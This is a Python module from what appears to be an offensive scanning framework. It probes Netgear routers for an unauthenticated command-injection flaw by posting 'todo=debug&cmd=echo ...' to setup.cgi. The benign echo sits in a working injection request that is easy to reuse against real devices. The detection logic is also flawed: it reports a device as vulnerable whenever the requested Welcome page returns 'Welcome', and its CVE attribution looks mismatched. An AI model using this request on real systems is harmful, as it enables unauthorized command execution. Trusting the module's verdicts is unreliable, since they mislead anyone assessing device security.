import httpx
from core.base import BaseModule

class Module(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "netgear/cve_2020_12109_scan"
        self.description = "Unauthenticated administrative endpoint bypass and SOAP handler scanner for Netgear (CVE-2020-12109)."
        self.type = "scan"
        self.options = {
            "TARGET": {"required": True, "value": ""},
            "PORT": {"required": False, "value": "80"}
        }

    async def run(self):
        target = self.options["TARGET"]["value"]
        port = self.options["PORT"]["value"]
        
        if not target.startswith(("http://", "https://")):
            url = f"http://{target}:{port}/setup.cgi?next_page=Welcome"
        else:
            url = f"{target.rstrip('/')}/setup.cgi?next_page=Welcome"
            
        headers = {"Content-Type": "application/x-www-form-urlencoded"}
        payload = "todo=debug&cmd=echo camhuntertest"
        
        try:
            async with httpx.AsyncClient(timeout=5.0, verify=False) as client:
                response = await client.post(url, content=payload, headers=headers)
                # If the system execution output handles the data directly or displays the setup interface
                if response.status_code == 200 and ("camhuntertest" in response.text or "Welcome" in response.text):
                    return {
                        "vulnerable": True,
                        "details": "Netgear administration interface processed inputs natively. Vulnerable to CVE-2020-12109."
                    }
        except Exception as e:
            return {"vulnerable": False, "error": str(e)}
        return {"vulnerable": False}
